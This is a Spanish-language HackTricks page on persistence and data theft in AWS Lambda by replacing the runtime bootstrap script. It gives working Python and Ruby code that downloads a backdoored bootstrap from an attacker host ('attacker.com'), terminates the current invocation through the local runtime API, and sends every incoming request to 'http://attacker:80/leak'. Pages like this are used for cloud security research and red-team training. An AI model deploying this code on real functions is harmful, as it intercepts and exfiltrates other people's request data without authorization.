# AWS - Robar Solicitudes de Lambda

<details>

<summary><strong>Aprende hacking de AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introducci√≥n <a href="#python-runtime" id="python-runtime"></a>

Este ataque supone que tienes alg√∫n tipo de **acceso sobre una Lambda en ejecuci√≥n**.\
Adem√°s, es importante notar que las **invocaciones de Lambda no est√°n completamente separadas entre s√≠, pero est√°n aisladas**. Podr√≠an ejecutarse, aunque no simult√°neamente, en el mismo entorno de ejecuci√≥n. Con eso en mente, comencemos a diseccionar ese entorno.

### Aislamiento

El aislamiento de Lambda utiliza estos cgroups:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Como el prefijo 'sandbox' no coincid√≠a con ning√∫n motor de contenedores com√∫n (docker, podman, LXD, rkt), podr√≠a ser un motor de contenedores propietario, que podr√≠a estar utilizando internamente un tiempo de ejecuci√≥n de contenedores de c√≥digo abierto como [runC](https://github.com/opencontainers/runc).

### C√≥mo funcionan las Lambdas  <a href="#python-runtime" id="python-runtime"></a>

Esta parece ser la arquitectura de Lambda de python:

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. Un proceso fuera del contenedor, referido como el "**slicer**" en el binario de inicio, env√≠a eventos de invocaci√≥n al proceso **init** a trav√©s de memoria compartida.
2. El proceso init configura un servidor HTTP en el puerto 9001 (codificado de forma fija), con varios puntos finales expuestos:
   1. /2018-06-01/runtime/invocation/**next** ‚Äì obtener el siguiente evento de invocaci√≥n
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** ‚Äì devolver la respuesta del manejador para la invocaci√≥n
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì devolver un error de ejecuci√≥n
3. En `bootstrap.py` el siguiente bucle **consulta al proceso init por un nuevo evento**, y luego **llama a la funci√≥n del usuario** para manejarlo (aqu√≠, el manejador de solicitudes que subiste se ejecuta).\


<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. La **respuesta del manejador es entonces enviada de vuelta al proceso init** a trav√©s de uno de los siguientes puntos finales:
   1. `/{invoke-id}/response` ‚Äì si el manejador del usuario se ejecut√≥ con √©xito
   2. `/{invoke-id}/error` ‚Äì si se produjo una excepci√≥n durante el manejo de la invocaci√≥n

## Resumen de la T√©cnica <a href="#python-runtime" id="python-runtime"></a>

Es posible **sustituir el script de arranque** con c√≥digo malicioso para poder **interceptar datos** enviados a la funci√≥n Lambda.\
Nota que **otros motores en otros lenguajes** tienen otro **script de arranque** escrito en ese lenguaje, por lo que esto se puede hacer **tambi√©n en otras lambdas que usan otros lenguajes**, no solo en python.

## Python <a href="#python-runtime" id="python-runtime"></a>

Desde la lambda, descarga **`/var/runtime/bootstrap.py`** (o simplemente inicia **tu propia lambda** y obt√©nlo) y a√±ade el backdoor que estar√° filtrando todos los datos enviados a Lambda. Solo necesitas a√±adir un par de l√≠neas como:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Reemplazando el Tiempo de Ejecuci√≥n

Ahora con el nuevo **`bootstrap.py` creado**, es posible **descargarlo**, **terminar la invocaci√≥n de lambda actual** y ejecutarlo para **reemplazar** el leg√≠timo:
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
O tambi√©n puedes usar [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), que terminar√° la invocaci√≥n como se hizo anteriormente, ejecutar√° el nuevo bootstrap y exfiltrar√° la informaci√≥n.

{% hint style="warning" %}
Si una funci√≥n lambda no se utiliza durante 5-15 minutos, se apagar√° y todos los cambios se perder√°n la pr√≥xima vez que se invoque.
{% endhint %}

## Ruby Runtime <a href="#ruby-runtime" id="ruby-runtime"></a>

En ruby, el archivo que quieres manipular es **`/var/runtime/lib/runtime.rb`** (obt√©nlo del sistema o ejecutando tu propia lambda).

Agregar una puerta trasera es tan simple como se hizo en la versi√≥n de python:
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
Entonces, solo necesitas hacer lo que hiciste en la versi√≥n de python con solo un cambio:

* **Descargar el backdoor en un directorio**
* **Symlink** `/var/runtime/lib/*` con el directorio donde est√° el backdoor
* Finalizar la invocaci√≥n actual de lambda
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## Referencias

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
